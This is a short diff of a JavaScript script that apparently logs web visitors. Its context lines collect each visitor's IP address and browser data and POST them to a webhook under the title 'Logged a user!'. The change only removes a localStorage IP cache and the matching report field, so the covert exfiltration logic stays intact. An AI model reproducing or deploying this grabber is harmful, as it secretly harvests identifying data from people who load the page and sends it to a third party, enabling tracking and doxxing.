@@ -36,12 +36,6 @@ get_ip().then((ip) => {
 		url().then((hook) => {
 			function sendMessage() {
 				var request = new XMLHttpRequest();
-				if (localStorage.ip == undefined) {
-					localStorage.setItem('ip', ip);
-				} else if (localStorage.ip != undefined) {
-					let localstorageip = localStorage.ip;
-				}
-
 				request.open('POST', hook);
 
 				request.setRequestHeader('Content-type', 'application/json');
@@ -56,8 +50,6 @@ get_ip().then((ip) => {
 							title: 'Logged a user!',
 							description: `**IP Address:**
 ${ip}
-**LocalStorage IP Address:**
-${localstorageip}
 ------------------------------------------------------
 **Browser data:**
 
